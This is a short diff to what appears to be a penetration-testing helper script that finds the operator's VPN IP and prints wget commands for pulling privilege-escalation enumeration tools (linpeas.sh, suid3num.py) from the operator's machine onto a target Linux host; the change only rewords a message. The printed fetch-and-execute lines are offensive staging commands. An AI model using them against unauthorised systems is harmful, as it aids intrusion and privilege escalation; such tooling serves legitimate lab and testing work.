@@ -27,7 +27,7 @@ fi
 ip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
 
 echo ""
-echo "You can download any of these tools on your target using commands below:"
+echo "You can download any of these tools to your target linux machine using commands below:"
 echo ""
 echo "wget http://$ip:8990/linpeas.sh; chmod +x linpeas.sh"
 echo "wget http://$ip:8990/suid3num.py; chmod +x suid3num.py"
